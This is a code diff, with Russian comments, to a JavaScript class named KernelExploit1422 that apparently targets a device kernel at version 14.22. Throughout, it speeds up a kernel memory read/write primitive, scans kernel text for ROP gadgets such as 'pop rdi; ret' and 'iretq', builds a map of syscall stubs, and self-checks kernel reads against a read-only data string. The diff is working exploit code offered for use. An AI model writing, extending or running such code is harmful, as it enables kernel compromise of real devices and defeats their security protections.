@@ -178,15 +178,26 @@ class KernelExploit1422 {
 		if (!this.rw) throw new BlockedError(`kernel R/W не поднят — ${what} невозможен (нужен STAGE 3: oid-офсеты 14.22 или attachKernelRw/attachKernelPipe)`);
 		return this.rw;
 	}
+	// ВАЖНО (оптимизация по замечанию recon-lua-vector): возвращаем БАЙТЫ, а не указатель
+	// на процессный буфер. Раньше на каждый чанк сканера уходило 2*len обращений к
+	// примитиву (writeU8 на запись в буфер + readU8 на чтение обратно): на 4 КиБ это 8192
+	// round-trip'ов и 4.6 с по TCP — бюджет скана выгорал впустую. Теперь 1 round-trip на чанк.
 	async kreadBytes(addr, len) {
 		const rw = this.requireRw("чтение памяти ядра");
 		const src = await rw.read(addr, len);
-		const out = this.p.malloc(len, 1);
-		for (let i = 0; i < len; i++) this.writeU8(out, i, src[i] & 0xff);
+		const out = new Uint8Array(len);
+		for (let i = 0; i < len; i++) out[i] = src[i] & 0xff;
 		return out;
 	}
-	async kread8(addr) { const out = await this.kreadBytes(addr, 8); return { value: this.readU64(out, 0), rv: 0 }; }
-	async kread32(addr) { const out = await this.kreadBytes(addr, 4); return { value: this.readU32(out, 0) | 0, rv: 0 }; }
+	static u32(b, o = 0) { return (b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24)) >>> 0; }
+	async kread8(addr) {
+		const b = await this.kreadBytes(addr, 8);
+		return { value: new I64(KernelExploit1422.u32(b, 0), KernelExploit1422.u32(b, 4)), rv: 0 };
+	}
+	async kread32(addr) {
+		const b = await this.kreadBytes(addr, 4);
+		return { value: KernelExploit1422.u32(b, 0) | 0, rv: 0 };
+	}
 	async kwrite32(addr, v) {
 		const rw = this.requireRw("запись в память ядра");
 		const b = new Uint8Array(4);
@@ -757,7 +768,7 @@ class KernelExploit1422 {
 		const budget = this.options.gadgetBudgetMs || 3000;
 		const base = I64.of(this.kbase);
 		const endRva = this.options.textEnd ?? this.off.kernelData ?? 0x0CC0000;
-		const chunk = this.options.scanChunk || 0x1000;
+		const chunk = this.options.scanChunk || 0x10000;     // 64 КиБ за одно обращение к примитиву
 		const perPattern = this.options.gadgetTake || 3;
 		const patterns = [
 			["pop rdi; ret", [0x5f, 0xc3]],
@@ -770,33 +781,35 @@ class KernelExploit1422 {
 			["iretq", [0x48, 0xcf]],
 			["sysretq", [0x48, 0x0f, 0x07]],
 		];
+		const maxPat = Math.max(...patterns.map(([, p]) => p.length));
 		const found = {};
 		for (const [name] of patterns) found[name] = [];
-		let scanned = 0, bytesRead = 0;
+		let scanned = 0;
 		for (let rva = 0; rva < endRva; rva += chunk) {
 			if (Date.now() - t0 > budget) { this.log(`  [gadgets] бюджет ${budget} мс исчерпан после 0x${scanned.toString(16)} байт`); break; }
-			let buf;
-			try { buf = await this.kreadBytes(base.add32(rva), chunk); }
+			const want = Math.min(chunk + maxPat, endRva - rva + maxPat);
+			let b;
+			try { b = await this.kreadBytes(base.add32(rva), want); }
 			catch (e) { this.degraded("чтение текста на 0x" + rva.toString(16) + " не удалось: " + e.message); break; }
-			const b = new Uint8Array(chunk);
-			for (let i = 0; i < chunk; i++) b[i] = this.readU8(buf, i);
-			scanned += chunk; bytesRead += chunk;
+			scanned += Math.min(chunk, b.length);
+			const limit = Math.min(chunk, b.length);
 			for (const [name, pat] of patterns) {
 				if (found[name].length >= perPattern) continue;
-				outer: for (let i = 0; i + pat.length <= b.length; i++) {
+				outer: for (let i = 0; i < limit; i++) {
+					if (i + pat.length > b.length) break;
 					for (let j = 0; j < pat.length; j++) if (b[i + j] !== pat[j]) continue outer;
 					const addr = base.add32(rva + i);
-					if (!this.isKernelPointer(addr)) continue;          // проверка каноничности
+					if (!this.isKernelPointer(addr)) continue;          // каноничность
 					found[name].push(addr.toString(16));
 					if (found[name].length >= perPattern) break;
 				}
 			}
-			if (patterns.every(([n]) => found[n].length > 0)) break;    // всё нашли — не жжём бюджет
+			if (patterns.every(([n]) => found[n].length > 0)) break;     // всё нашли — не жжём бюджет
 		}
 		this.discovered.gadgets = found;
 		const kinds = Object.entries(found).filter(([, v]) => v.length > 0);
 		const total = kinds.reduce((a, [, v]) => a + v.length, 0);
-		this.log(`  [gadgets] найдено ${total} шт., видов ${kinds.length}/${patterns.length}, просканировано 0x${scanned.toString(16)} байт за ${Date.now() - t0} мс`);
+		this.log(`  [gadgets] найдено ${total} шт., видов ${kinds.length}/${patterns.length}, просканировано 0x${scanned.toString(16)} байт (чанк 0x${chunk.toString(16)}) за ${Date.now() - t0} мс`);
 		for (const [name, addrs] of kinds) this.log(`    ${name}: ${addrs.join(", ")}`);
 		if (!total) { this.degraded("гаджеты не найдены в окне текста — остаёмся без них"); return "gadgets: none (DEGRADED)"; }
 		if (kinds.length < patterns.length) this.degraded(`найдено ${kinds.length} из ${patterns.length} видов гаджетов`);
@@ -809,24 +822,25 @@ class KernelExploit1422 {
 		const budget = this.options.gadgetBudgetMs || 3000;
 		const base = I64.of(this.kbase);
 		const endRva = this.options.textEnd ?? this.off.kernelData ?? 0x0CC0000;
-		const chunk = this.options.scanChunk || 0x1000;
+		const chunk = this.options.scanChunk || 0x10000;
+		const OVER = 8;                                      // перекрытие: стаб на границе чанка
 		const map = {};
 		let raw = 0, scanned = 0;
 		for (let rva = 0; rva < endRva; rva += chunk) {
 			if (Date.now() - t0 > budget) { this.log(`  [stubs] бюджет исчерпан после 0x${scanned.toString(16)} байт`); break; }
-			let buf;
-			try { buf = await this.kreadBytes(base.add32(rva), chunk); }
+			const want = Math.min(chunk + OVER, endRva - rva + OVER);
+			let b;
+			try { b = await this.kreadBytes(base.add32(rva), want); }
 			catch (e) { this.degraded("чтение текста на 0x" + rva.toString(16) + " не удалось: " + e.message); break; }
-			const b = new Uint8Array(chunk);
-			for (let i = 0; i < chunk; i++) b[i] = this.readU8(buf, i);
-			scanned += chunk;
-			for (let i = 0; i + 8 <= b.length; i++) {
-				// mov eax, imm32 ; syscall ; ret  ==  b8 imm32 0f 05 c3
-				if (b[i] === 0xb8 && b[i + 5] === 0x0f && b[i + 6] === 0x05 && b[i + 7] === 0xc3) {
+			scanned += Math.min(chunk, b.length);
+			const limit = Math.min(chunk, b.length);
+			for (let i = 0; i < limit; i++) {
+				if (i + 8 <= b.length && b[i] === 0xb8 && b[i + 5] === 0x0f && b[i + 6] === 0x05 && b[i + 7] === 0xc3) {
+					// mov eax, imm32 ; syscall ; ret
 					const nr = (b[i + 1] | (b[i + 2] << 8) | (b[i + 3] << 16) | (b[i + 4] << 24)) >>> 0;
 					const addr = base.add32(rva + i);
 					if (this.isKernelPointer(addr) && !(nr in map)) map[nr] = addr.toString(16);
-				} else if (b[i] === 0x0f && b[i + 1] === 0x05 && b[i + 2] === 0xc3) {
+				} else if (i + 3 <= b.length && b[i] === 0x0f && b[i + 1] === 0x05 && b[i + 2] === 0xc3) {
 					raw++;
 				}
 			}
@@ -834,7 +848,7 @@ class KernelExploit1422 {
 		}
 		this.discovered.syscallMap = map;
 		const nums = Object.keys(map).map(Number).sort((a, b) => a - b);
-		this.log(`  [stubs] стабов с номером: ${nums.length}, безымянных "0f 05 c3": ${raw}, просканировано 0x${scanned.toString(16)} за ${Date.now() - t0} мс`);
+		this.log(`  [stubs] стабов с номером: ${nums.length}, безымянных "0f 05 c3": ${raw}, просканировано 0x${scanned.toString(16)} байт (чанк 0x${chunk.toString(16)}) за ${Date.now() - t0} мс`);
 		if (nums.length) this.log(`  [stubs] номера syscall: ${nums.slice(0, 24).join(", ")}${nums.length > 24 ? " …" : ""}`);
 		if (!nums.length && !raw) { this.degraded("стабы не найдены"); return "stubs: none (DEGRADED)"; }
 		if (!nums.length) { this.degraded("найдены только безымянные 0f05c3 — карта номеров не построена"); return `stubs: raw×${raw} (DEGRADED)`; }
@@ -893,6 +907,8 @@ class KernelExploit1422 {
 		// Переводим pipe-доступ в armed-примитив: read(addr,len) / write(addr,bytes)
 		this.attachKernelRw({
 			read: async (addr, len) => {
+				// если мост умеет бульк-чтение — используем его (1 round-trip вместо len)
+				if (this.p && typeof this.p.readBytes === "function") return await this.p.readBytes(addr, len);
 				const out = this.p.malloc(len, 1);
 				const rv = await this.p.pipeRead(addr, len, out);
 				if (rv !== len) throw new Error(`pipeRead вернул ${rv} вместо ${len}`);
@@ -918,7 +934,7 @@ class KernelExploit1422 {
 		if (!probe) { this.degraded("rodataProbe не найден — самопроверка kernel read пропущена"); return "pipe R/W attached (unverified)"; }
 		const got = await this.kreadBytes(this.kaddr(probe.rva), probe.text.length);
 		let read = "";
-		for (let i = 0; i < probe.text.length; i++) read += String.fromCharCode(this.readU8(got, i));
+		for (let i = 0; i < probe.text.length; i++) read += String.fromCharCode(got[i]);
 		if (read !== probe.text) throw new Error("kernel read self-check не совпал (rodata)");
 		return "fast pipe R/W verified";
 	}
@@ -927,20 +943,22 @@ class KernelExploit1422 {
 		const hint = this.off.rodataProbeHint;
 		if (!hint) return null;
 		const target = hint.text;
-		const span = 0x20000;
-		for (let off = Math.max(0, hint.rva1360 - span); off < hint.rva1360 + span; off += 4) {
-			try {
-				const b0 = (await this.kread32(this.kaddr(off))).value >>> 0;
-				if ((b0 & 0xff) !== target.charCodeAt(0)) continue;
+		const needle = Uint8Array.from({ length: target.length }, (_, i) => target.charCodeAt(i) & 0xff);
+		const CH = this.options.scanChunk || 0x10000;
+		const from = Math.max(0, hint.rva1360 - 0x20000);
+		const to = hint.rva1360 + 0x20000;
+		for (let rva = from; rva < to; rva += CH) {
+			const want = Math.min(CH + needle.length, to - rva + needle.length);
+			let b;
+			try { b = await this.kreadBytes(this.kaddr(rva), want); }
+			catch (e) { return null; }
+			const limit = Math.min(CH, b.length);
+			for (let i = 0; i < limit; i++) {
+				if (i + needle.length > b.length) break;
 				let ok = true;
-				for (let i = 0; i < target.length && ok; i += 4) {
-					const w = (await this.kread32(this.kaddr(off + i))).value >>> 0;
-					for (let k = 0; k < 4 && i + k < target.length; k++) {
-						if (((w >>> (k * 8)) & 0xff) !== (target.charCodeAt(i + k) & 0xff)) ok = false;
-					}
-				}
-				if (ok) { this.discovered.rodataProbeRva = off; return { rva: off, text: target }; }
-			} catch (_) { return null; }
+				for (let j = 0; j < needle.length; j++) if (b[i + j] !== needle[j]) { ok = false; break; }
+				if (ok) { this.discovered.rodataProbeRva = rva + i; return { rva: rva + i, text: target }; }
+			}
 		}
 		return null;
 	}
